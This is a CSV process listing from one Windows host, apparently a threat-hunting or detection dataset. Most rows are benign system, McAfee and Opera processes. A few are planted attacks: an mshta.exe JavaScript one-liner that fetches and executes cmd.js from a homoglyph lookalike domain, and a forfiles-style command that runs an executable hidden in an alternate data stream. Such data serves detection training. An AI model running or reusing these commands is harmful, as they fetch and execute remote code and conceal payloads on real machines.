,arguments,hostname,name,path,pid,username
27,C:\Windows\system32\svchost.exe -k RPCSS,0002PKYWB,svchost.exe,C:\Windows\system32,2632,NT AUTHORITY\SYSTEM
28,"""LogonUI.exe"" /flags:0x0",0002PKYWB,LogonUI.exe,C:\Windows\system32,4836,NT AUTHORITY\SYSTEM
31,"""dwm.exe""",0002PKYWB,dwm.exe,C:\Windows\system32,5140,NT AUTHORITY\SYSTEM
32,C:\ProgramData\McAfee\McInstruTrack\McInstruTrack.exe /SP:0,0002PKYWB,McInstruTrack.exe,C:\ProgramData\McAfee\McInstruTrack,6411,dar.nelso
33,javascript:a=(GetObject('http://www.Шordpress.io/cmd.js')).Exec();close(),0002PKYWB,mshta.exe,C:\Program Files\mshta.exe,1380,iri.jone4
34,"""C:\Program Files\Common Files\McAfee\MMSSHost\MMSSHOST.EXE"" MMSCOM homenetsvc",0002PKYWB,MMSSHOST.EXE,C:\Program Files\Common Files\McAfee\MMSSHost,3779,dar.nelso
36,C:\Windows\system32\wbem\wmiprvse.exe,0002PKYWB,wmiprvse.exe,C:\Windows\system32\wbem,5060,NT AUTHORITY\SYSTEM
38,C:\ProgramData\McAfee\Direct\McDiReg.exe -MONITOR_PI2 9508,0002PKYWB,McDiReg.exe,C:\ProgramData\McAfee\Direct,4824,dar.nelso
39,"""C:\Users\iri.jone4\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=16451249972883912486 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=16451249972883912486 --renderer-client-id=4 --mojo-platform-channel-handle=3140 /prefetch:1",0002PKYWB,opera.exe,C:\Users\iri.jone4\AppData\Local\Programs\Opera\56.0.3051.52,5705,iri.jone4
40,C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted,0002PKYWB,svchost.exe,C:\Windows\System32,972,NT AUTHORITY\SYSTEM
45,C:\Windows\System32\svchost.exe -k termsvcs,0002PKYWB,svchost.exe,C:\Windows\System32,6200,NT AUTHORITY\SYSTEM
47,"""C:\\Program Files\\Common Files\\McAfee\ModuleCore\\ProtectedModuleHost.exe""",0002PKYWB,ProtectedModuleHost.exe,C:\Program Files\Common Files\McAfee\ModuleCore,1847,dar.nelso
48,C:\Windows\System32\svchost.exe -k utcsvc,0002PKYWB,svchost.exe,C:\Windows\System32,5240,NT AUTHORITY\SYSTEM
50,"""C:\Users\iri.jone4\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=2685998191293934672 --lang=en-GB --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=2685998191293934672 --renderer-client-id=12 --mojo-platform-channel-handle=4360 /prefetch:1",0002PKYWB,opera.exe,C:\Users\iri.jone4\AppData\Local\Programs\Opera\56.0.3051.52,3574,iri.jone4
52,C:\Windows\System32\forfile.exe /p c:\windows\system32 /m notepad.exe /c C:\Windows\Temp\setupapi.dll:kpecigh29.exe,0002PKYWB,forfile.exe,C:\Windows\System32\forfile.exe,4924,iri.jone4
53,"""C:\Program Files\McAfee\WebAdvisor\ServiceHost.exe""",0002PKYWB,ServiceHost.exe,C:\Program Files\McAfee\WebAdvisor,3420,dar.nelso
54,ModuleCoreService.exe /startUserModeHosting=4_TIME_TO_DIE,0002PKYWB,ModuleCoreService.exe,c:\program files\common files\mcafee\modulecore,2160,dar.nelso
55,"""C:\ProgramData\McAfee\Direct\McDiReg.exe"" ",0002PKYWB,McDiReg.exe,C:\ProgramData\McAfee\Direct,2133,dar.nelso
56,"C:\Users\iri.jone4\AppData\Local\Programs\Opera\56.0.3051.52\opera_crashreporter.exe --type=crashpad-handler /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\iri.jone4\AppData\Roaming\Opera Software\Opera Stable\Crash Reports"" ""--crash-count-file=C:\Users\iri.jone4\AppData\Roaming\Opera Software\Opera Stable\crash_count.txt"" --url=https://crashstats-collector.opera.com/collector/submit --annotation=channel=Stable --annotation=plat=Win64 --annotation=prod=OperaDesktop --annotation=ver=56.0.3051.52 --initial-client-data=0x238 0x304 0x30c 0x320 0x308 0x7ffb51313108 0x7ffb51313118 0x7ffb51313128",0002PKYWB,opera_crashreporter.exe,C:\Users\iri.jone4\AppData\Local\Programs\Opera\56.0.3051.52,4373,iri.jone4
61,"""c:\program files\common files\mcafee\modulecore\modulecoreservice.exe""",0002PKYWB,modulecoreservice.exe,c:\program files\common files\mcafee\modulecore,4762,dar.nelso
70,"""C:\Users\dar.nelso\AppData\Local\Temp\scoped_dir9616_4071\mcafee_trial_setup_433.0207.3919_key.exe"" ",0002PKYWB,mcafee_trial_setup_433.0207.3919_key.exe,C:\Users\dar.nelso\AppData\Local\Temp\scoped_dir9616_4071,1384,dar.nelso
72,"""C:\Program Files\Common Files\McAfee\CSP\3.0.127.0\\McCSPServiceHost.exe""",0002PKYWB,McCSPServiceHost.exe,C:\Program Files\Common Files\McAfee\CSP\3.0.127.0,2561,dar.nelso
74,"""C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Binn\sqlservr.exe"" -sSQLEXPRESS",0002PKYWB,sqlservr.exe,C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Binn,1689,xav.par72
76,"""C:\Users\iri.jone4\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --start-maximized --ran-launcher",0002PKYWB,opera.exe,C:\Users\iri.jone4\AppData\Local\Programs\Opera\56.0.3051.52,6295,iri.jone4
79,"""C:\Users\iri.jone4\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=gpu-process --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --gpu-preferences=KAAAAAAAAACAAwBAAQAAAAAAAAAAAGAAAAAAAAAAAAAIAAAAAAAAACgAAAAEAAAAIAAAAAAAAAAoAAAAAAAAADAAAAAAAAAAOAAAAAAAAAAQAAAAAAAAAAAAAAAKAAAAEAAAAAAAAAAAAAAACwAAABAAAAAAAAAAAQAAAAoAAAAQAAAAAAAAAAEAAAALAAAA --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --service-request-channel-token=7207758415534163028 --mojo-platform-channel-handle=1472 --ignored="" --type=renderer "" /prefetch:2",0002PKYWB,opera.exe,C:\Users\iri.jone4\AppData\Local\Programs\Opera\56.0.3051.52,1722,iri.jone4
82,C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork,0002PKYWB,svchost.exe,C:\Windows\system32,4900,NT AUTHORITY\SYSTEM
84,"""C:\Program Files\Common Files\McAfee\Platform\Core\mchost.exe"" {e05dd3fd-ba47-4235-85a5-3789db83c8e1} /pid=444",0002PKYWB,mchost.exe,C:\Program Files\Common Files\McAfee\Platform\Core,3584,dar.nelso
86,"""C:\Program Files\Common Files\McAfee\AMCore\mcshield.exe""",0002PKYWB,mcshield.exe,C:\Program Files\Common Files\McAfee\AMCore,2500,dar.nelso
91,"""C:\Program Files\McAfee\MfeAV\MFEAvSvc.exe""",0002PKYWB,MFEAvSvc.exe,C:\Program Files\McAfee\MfeAV,4949,dar.nelso
101,winlogon.exe,0002PKYWB,winlogon.exe,C:\Windows\system32,4772,NT AUTHORITY\SYSTEM
102,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",0002PKYWB,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,5901,xav.par72
105,C:\Windows\System32\cmd.exe /C w32tm /tz,0002PKYWB,cmd.exe,C:\Windows\System32\cmd.exe,3548,iri.jone4
108,C:\Windows\system32\svchost.exe -k DcomLaunch,0002PKYWB,svchost.exe,C:\Windows\system32,3624,NT AUTHORITY\SYSTEM
